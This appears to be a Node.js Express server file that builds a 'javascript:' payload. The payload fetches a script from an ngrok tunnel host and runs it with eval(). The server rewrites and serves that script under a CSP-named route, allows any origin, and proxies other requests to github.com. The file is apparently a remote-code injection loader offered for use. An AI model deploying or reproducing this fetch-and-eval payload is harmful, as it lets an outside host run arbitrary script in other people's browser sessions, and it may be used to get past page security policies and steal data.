var app = exports.app = require('express')();
var proxy = require('http-proxy-middleware');
//app.listen(3031);
const path = require('path');
const fs = require('fs');
// use any not used addresses as script address

const changeUrlReg = /var serverSiteUrl \= \"(?:.*?)\"/ // replace serverSiteUrl Dynamicly

var ngrokUrl = '//c813f5de.ngrok.io' // use your own! 
var cspScriptUrl = `javascript:(()=>{var x=new XMLHttpRequest();x.onreadystatechange=()=>{if(x.readyState==4&&x.status==200){var ms=x.responseText.toString();eval(ms)}};x.open("GET","${ngrokUrl}/csp1024",true);x.send()})()`
console.log(cspScriptUrl);
app.get('/csp1024', function (req, res) {
  res.set({
    'Content-Type': 'text/plain',
    'Access-Control-Allow-Origin': '*'
  })
  let script = fs.readFileSync(path.join(__dirname, '../../src/scripts/xylole-client-csp.js')).toString()
  let newScript = script.replace(changeUrlReg, function (match) {
    let newUrl = `var serverSiteUrl = "${ngrokUrl}"`
    return newUrl
  })
  res.send(newScript)
})

// const socketIoScript = fs.readFileSync( __dirname +'/src/scripts/socket.io-1.4.5.js').toString()
app.get('/socket', function (req, res) {
  res.set({
    'Content-Type': 'text/plain',
    'Access-Control-Allow-Origin': '*',
  })
  // let socketIoScript = fs.readFileSync( __dirname +'/src/scripts/socket.io-1.4.5.js').toString()
  // res.send(socketIoScript)
  res.sendFile(path.join(__dirname, '../../src/scripts/socket.io-1.4.5.js'))
})

app.use('/', proxy({target: 'https://github.com',
                          changeOrigin: true}));
//port 3031 for domain-one.com
//port 3032 for domain-two.com
